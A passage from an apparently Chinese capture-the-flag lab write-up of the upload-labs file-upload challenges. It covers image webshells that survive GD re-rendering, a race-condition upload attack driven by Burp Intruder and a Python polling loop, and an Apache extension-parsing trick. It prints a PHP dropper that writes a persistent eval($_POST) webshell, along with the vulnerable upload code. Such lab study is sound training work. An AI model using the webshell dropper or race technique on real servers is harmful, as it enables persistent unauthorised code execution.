个以上的数据块构成，其中 <kbd>IHDR</kbd>、<kbd>IDAT</kbd>、<kbd>IEND</kbd> 是必须有的三个关键数据块，分别表示文件头数据块、图像数据块和图像结束数据块，此外还有一个可选的关键数据块 <kbd>PLTE</kbd>，表示调色板数据块。当然还有许许多多的辅助数据块，这里就不涉及了，可参考 <a href="https://www.cnblogs.com/lidabo/p/3701197.html">这篇文章</a> 详细解析。</p><p>我们需要知道的是，每个数据块都由 <kbd>Length (长度)</kbd>、<kbd>Chunk Type Code (数据块类型码)</kbd> 、<kbd>Chunk Data (数据块数据)</kbd>、<kbd>CRC (循环冗余检测)</kbd>，其中重点在于最后的 <kbd>CRC</kbd> ，他是用来检测是否有错误的循环冗余码。相当于，只要内容被修改了，大概率可以 <kbd>CRC</kbd> 检测出来。而 php 处理 PNG 图片文件时，就会首先检验 <kbd>CRC</kbd> 以及长度，若不正确就有理由怀疑你放毒，就会报错。因此，若在 PNG 图片中藏木马，则应一并修改所属数据块的 <kbd>CRC</kbd> 及长度。 此外，许多数据块都具有相对固定的格式与长度，显然我们无法以这类数据块为目标。</p></li><li><p>最后就是 <kbd>.jpg</kbd> 文件：JPG</p><p>依然之前说到，JPG 的文件头为 <kbd>FFD8FF</kbd>，事实上这依然不严格。JPG 文件由八个部分组成，每个部分称为『段』，每个段的头两个字节作为标记，其中首字节固定为 <kbd>FF</kbd> ，因此上述文件头实际是 JPG 文件头段 <kbd>FFD8</kbd> 与后续部分的首字节相连形成，其中 <kbd>D8</kbd> 为文件头的标记码。段与段之间可以有多个 <kbd>FF</kbd> 且会自动忽略取最后一个。除了文件头段与文件尾段仅含标记码用来标记段类型，其余所有段的结构均为 <code>段标识（FF）+段类型（标记码）+段长度+段内容</code>，其中段长度占两个字节，包括段内容和段长度本身，不包括段标识和段类型。关于各个段更加详细的内容，这里依然不多赘述，可参考 <a href="https://wenku.baidu.com/view/8ea0fbfb04a1b0717fd5dd57.html">这篇文档</a> 详细解析。</p><p>我们需要知道的是，JPG 文件使用有损压缩，因此即使能正常嵌入文件，也需要保证重渲染后木马不会被改变。</p></li></ul></li></ul><h3 id="突破限制-18">突破限制</h3><ul><li><p>重渲染用到的 <kbd>imagecreatefrom*</kbd> 函数需要 <kbd>GD</kbd> 库的支持，很遗憾 BUU 依然没有执行这项配置，因此本关依然部署于本地，在 <kbd>phpstudy</kbd> 中只需将 <kbd>php_gd2</kbd> 勾选即可，更多详细配置可 <a href="https://www.php.net/manual/zh/image.installation.php">参考这里</a> 。</p><img src="https://bu.dusays.com/2022/05/19/6286269bdd968.webp" alt="" style="zoom: 75%;" /></li><li><p>分别用三种图片进行图片马的构建</p><ul><li><p>GIF</p><p>构建 GIF 图片码会相对简单，上传下载再比较，好家伙图片直接静态了。</p><center>    <img src="https://bu.dusays.com/2022/05/19/6286269d4a3fa.gif" alt="" style="zoom: 75%;"/>    <div style="display: inline-block;                padding: 2px;                border-bottom: 1px solid #d9d9d9;                font-size: 75%;">        原 GIF 文件    </div></center><center>    <img src="https://bu.dusays.com/2022/05/19/62862671b6d27.gif" alt="" style="zoom: 75%;"/>    <div style="display: inline-block;                padding: 2px;                border-bottom: 1px solid #d9d9d9;                font-size: 75%;">        重渲染 GIF 文件    </div></center><p>将两个文件在 <kbd>UltraCompare</kbd> 中打开，可以看到前排的数据大部分都保留完好，因此基本可以将木马放在这部分。</p><img src="https://bu.dusays.com/2022/05/19/628626722bf92.webp" alt="" style="zoom: 75%;" /><p>随机插入一个位置，保存后继续上传，打开后貌似失败了，继续对比数据内容，发现木马数据被拎出来了。</p><img src="https://bu.dusays.com/2022/05/19/628626760644f.webp" alt="" style="zoom: 75%;" /><p>遇到这种情况呢，那没办法，得换个位置。于是乎又尝试了几次，最后还是成功了！</p><img src="https://bu.dusays.com/2022/05/19/628626784b988.webp" alt="" style="zoom: 75%;" /></li><li><p>PNG</p><p>对于 PNG 文件，基本要使用脚本进行编辑，网络上可以找到许多代码，由于我暂时无法自主实现，<psw>太菜了</psw>，因此不作展示。</p></li><li><p>JPG</p><p>不作展示，理由同上。</p></li></ul></li></ul><h3 id="夺旗-16">夺旗</h3><ul><li><p>很遗憾，只完成了一个文件，不过还好这并不影响结果，蚁剑连接，成功！</p><img src="https://bu.dusays.com/2022/05/19/62862689b7fb8.webp" alt="" style="zoom: 75%;" /></li><li><p>本地无旗，我们看视频</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=683649447&bvid=BV1aS4y1w7Lg&cid=711353293&page=1&danmaku=0" scrolling="yes" border="0" frameborder="no" framespacing="0" allowfullscreen="allowfullscreen" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe></div></li></ul><h2 id="Pass-18">Pass-18</h2><h3 id="启动靶机-28">启动靶机</h3><ul><li><p>又回到这个页面了就是说，最近由于 BUU 抽风，网页有点不稳定，因此最后四关默认本地部署，也就是再无 flag 了。</p><img src="https://bu.dusays.com/2022/05/20/628773707b1b4.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="研究环境">研究环境</h3><ul><li><p>先看提示</p><img src="https://bu.dusays.com/2022/05/20/62877373637bb.webp" alt="" style="zoom: 75%;" /></li><li><p>既然盛情邀请，那就恭敬不如从命，看源码！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="comment">// 构造白名单</span></span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="comment">// 读取文件名</span></span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="comment">// 读取临时文件名</span></span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$file_name</span>,strrpos(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 读取文件后缀名</span></span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">    <span class="comment">// 确定上传路径，使用获取到的文件名</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">            <span class="comment">// 判断后缀名是否在白名单中</span></span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             rename(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">            <span class="comment">// 为文件随机重命名</span></span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            unlink(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>为方便解读我在代码中添加了注释，仅仅是单纯的上传后比对白名单后重命名。如果利用文件包含漏洞的话，本关可以轻易完成，因为程序只检查后缀名，因此直接将木马文件的后缀名修改为任一合法后缀名然后文件包含即可。不过本关应该值得更优雅的方法，大致思路是，由于程序会优先完成上传动作，而数量多了后续检查后缀名就无法快速完成，那我们快速上传一堆木马文件，就会留出足够的时间让我们完成入侵。这就是条件竞争。</p></li><li><p>不过，假设文件访问成功了，但是过不了多久还是会被删除，而失去了木马文件侵略也就失效了，为此我们可以修改以下木马文件。既然访问木马文件就会执行里面的程序，那如果程序中含有能生成新的木马文件的代码呢，这样只要成功访问一次上传的木马，就相当于在服务器中永久植入了木马！因此，修改木马内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&#x27;h-t-m-2.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>), <span class="string">&#x27;&lt;?php @eval($_POST[&quot;h-t-m&quot;]);phpinfo();?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><kbd>fopen()</kbd> 函数用于打开文件，如果文件不存在则创建新文件，而 <kbd>fputs()</kbd> 则会将字符串写入文件中，而字符串的内容就是我们熟悉的一句话木马了，值得注意的是新创建的文件一定不能与上传的木马文件名相同，毕竟删除是基于文件名的。</li></ul><h3 id="突破限制-19">突破限制</h3><ul><li><p>短时间重复多次上传，手动肯定是来不及的，因此在 <kbd>Burp Suite</kbd> 中打开靶机，直接上传文件抓包，右键 <kbd>send to Intruder</kbd>.</p><img src="https://bu.dusays.com/2022/05/20/62877375946bf.webp" alt="" style="zoom: 75%;" /></li><li><p>在 <kbd>Intruder</kbd> 下的 <kbd>Positions</kbd> 页面就可以看到我们上传文件抓到的包了，现在我们只需一直发送这个包即可。首先在 <kbd>Positions</kbd> 页面点击 <kbd>clear §</kbd> 其中 <kbd>§</kbd> 用于包裹有效荷载，由于我们不需要修改，因此删除 <kbd>§</kbd>.</p><img src="https://bu.dusays.com/2022/05/20/628773772b834.webp" alt="" style="zoom: 75%;" /></li><li><p>之后转到 <kbd>Payloads</kbd> 页面修改 <kbd>Payload type</kbd> 同样因为我们不需要修改有效荷载，因此选择 <kbd>Null payloads</kbd>.</p><img src="https://bu.dusays.com/2022/05/20/62877378b7d66.webp" alt="" style="zoom: 75%;" /></li><li><p>之后该页面就会多一个条目 <kbd>Payload Option [Null payloads]</kbd>，这里选择 <kbd>Continue indefinitely</kbd>，即无限重放，只要我们不喊停，他就会一直发包。</p><img src="https://bu.dusays.com/2022/05/20/6287737a0a826.webp" alt="" style="zoom: 75%;" /></li><li><p>当然，默认状态下并发请求数为 10，若觉得不够，可以在 <kbd>Resource Pool</kbd> 页面下创建新的 <kbd>resource pool</kbd> 并指定并发请求数。</p><img src="https://bu.dusays.com/2022/05/20/6287737b7aba7.webp" alt="" style="zoom: 75%;" /></li><li><p>最后点击右上角橙色按钮 <kbd>Start attack</kbd> 即开始运作，如果是本地部署的话，可以看到本地 <kbd>upload</kbd> 文件夹下不停闪烁着上传的木马文件。只需在他存在的期间访问他，即可完成木马的植入。</p><img src="https://bu.dusays.com/2022/05/20/628773705a2f8.webp" alt="" style="zoom: 75%;" /></li><li><p>如果只是继续用浏览器不断刷新访问，既不够高效，也不够优雅，甚至访问极其容易出错，完全对不起 <kbd>Burp Suite</kbd> 的效率。因此建议使用脚本，如下 Python 代码即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;[靶机地址]/upload/[文件名]&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Nice!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>其中 <kbd>requests.get(url)</kbd> 即对链接的访问，而 <kbd>html.status_code</kbd> 代表访问返回的状态码，200 即成功处理。</p></li><li><kbd>Intruder</kbd> 在发包的同时运行上述 Python 代码，当屏幕输出一句响亮的 <kbd>Nice!</kbd>，说明木马已成功植入。<img src="https://bu.dusays.com/2022/05/20/6287737455ccb.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="夺旗-17">夺旗</h3><ul><li><p>蚁剑连接，当然要连接的应该是我们通过木马文件间接植入的文件。</p><img src="https://bu.dusays.com/2022/05/20/628773727bbe1.webp" alt="" style="zoom: 75%;" /></li><li><p>依旧本地无旗，继续看个视频。</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=811356764&bvid=BV1U34y187Df&cid=712642962&page=1&danmaku=0" scrolling="yes" border="0" frameborder="no" framespacing="0" allowfullscreen="allowfullscreen" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe></div></li></ul><h2 id="Pass-19">Pass-19</h2><h3 id="启动靶机-29">启动靶机</h3><ul><li><p>最后三关，加油！</p><img src="https://bu.dusays.com/2022/05/22/628a5600553cb.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="研究页面-13">研究页面</h3><ul><li><p>查看提示</p><img src="https://bu.dusays.com/2022/05/22/628a55ffd4c99.webp" alt="" style="zoom: 75%;" /><p>依然是代码审计，所以看源码！</p></li><li><p>源代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =time();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> MyUpload(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;setDir( <span class="variable">$dir</span> );</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>代码分为两部分，隶属于 <kbd>index.php</kbd> 的执行代码与隶属于 <kbd>myupload.php</kbd> 的 <kbd>MyUpload</kbd> 类，对上传文件所执行的操作基本集中在该类中。当然这里只提供了该类的一个预览，让我们知道大致有哪些功能，具体的实现都在靶机后台。</p></li><li><p>首先是白名单部分，本关的白名单数量较多，不再仅限于图片三巨头。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(<span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>, <span class="string">&quot;.ppt&quot;</span>, <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br></pre></td></tr></table></figure></li><li><p>接下来是程序唯一可调用的 <kbd>MyUpload</kbd> 类中的函数 <kbd>upload</kbd>，依据代码可判断，只要维持变量 <kbd>&#36;ret</kbd> 等于 <strong>1</strong> 即可。而要满足这一条件，文件则必须正确通过以下函数，函数内容可由函数名推测。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">isUploadedFile()    <span class="comment">// 检查文件能否上传到服务器临时目录</span></span><br><span class="line">setDir( <span class="variable">$dir</span> )      <span class="comment">// 检查目录是否可以写入</span></span><br><span class="line">checkExtension()    <span class="comment">// 将文件后缀名与白名单比对</span></span><br><span class="line">checkSize()         <span class="comment">// 检查文件是否过大</span></span><br><span class="line">checkFileExists()   <span class="comment">// 检查文件是否已存在（同名）</span></span><br><span class="line">move()              <span class="comment">// 移动至指定目录</span></span><br><span class="line">renameFile()        <span class="comment">// 重命名</span></span><br></pre></td></tr></table></figure><p>可以看出，这次上传文件需要先检查后缀名 <kbd>checkExtension()</kbd> 然后才会在目录中传好文件 <kbd>move()</kbd>，因此，本次的文件后缀名必须在白名单内。如果通过文件包含的话，依然可以简单构造图片马就能成功，不过，本关依然值得更优雅的方法。</p></li><li><p>这里可以利用 Apache 的解析漏洞，由于 Apache 解析文件从右向左解析，如果后缀名无法识别，就会忽略并继续继续向左解析。例如，文件名为 <kbd>h-t-m.php.h-t-m</kbd> 的文件，由于 <kbd>.h-t-m</kbd> 后缀无法识别，因此文件会被解析为 <kbd>h-t-m.php</kbd>。而 Apache 可识别哪些文件后缀名，可以在 Apache 的 <kbd>conf</kbd> 目录下的 <kbd>mime.typs</kbd> 中找到。</p></li><li><p>但是，并不是将符合条件的文件上传即可，因为从源代码中可以看出，程序会对文件进行重命名，而重命名则会导致漏洞失效，因此依然需要使用条件竞争，在重命名之前执行文件！</p></li></ul><h3 id="突破限制-20">突破限制</h3><ul><li><p>查找 <kbd>mime.typs</kbd> 文件，与白名单中一一做比较，然而事情并没有这么顺利，因为在我本地的文件中，白名单的所有后缀名均能识别。那没办法，只能手动更改了，在白名单中挑选一个 